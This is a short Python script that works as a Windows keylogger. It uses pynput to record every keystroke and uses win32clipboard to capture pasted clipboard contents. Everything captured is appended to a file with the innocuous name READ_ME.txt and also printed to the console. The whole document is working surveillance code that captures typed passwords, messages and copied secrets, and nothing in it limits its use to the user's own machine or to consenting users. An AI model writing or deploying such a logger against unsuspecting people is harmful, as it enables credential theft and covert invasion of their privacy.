from pynput.keyboard import Key, Listener
import ctypes
import win32clipboard

keytochar = {Key.enter: '\n', Key.backspace: '\b', Key.space: ' ', Key.delete: '\b', Key.tab: '\t'}
keytoflag = {Key.ctrl_r: 1, Key.ctrl_l: 1, Key.alt_r: 2, Key.alt_l: 2, Key.shift_r: 3, Key.shift: 3, Key.caps_lock: 4, Key.esc: 5}
hllDll = ctypes.WinDLL("User32.dll")


def addData(x):
    global answer
    print(x)
    answer = answer + x
    f = open("READ_ME.txt", "a")
    f.write(x)
    f.close()


def on_press(key):
    global answer
    print(str(key))
    if str(key).encode() == b"'\\x16'":  # paste
        win32clipboard.OpenClipboard()
        x = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        addData(x)

    elif len(str(key)) == 3:
        x = format(key.char)
        addData(x)

    elif key in keytochar:
        x = keytochar.get(key)
        addData(x)


def on_release(key):
    global answer
    if key == Key.esc:
        # Stop listener
        print(answer)
        answer=""


# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    answer = ""
    listener.join()
    print(answer)
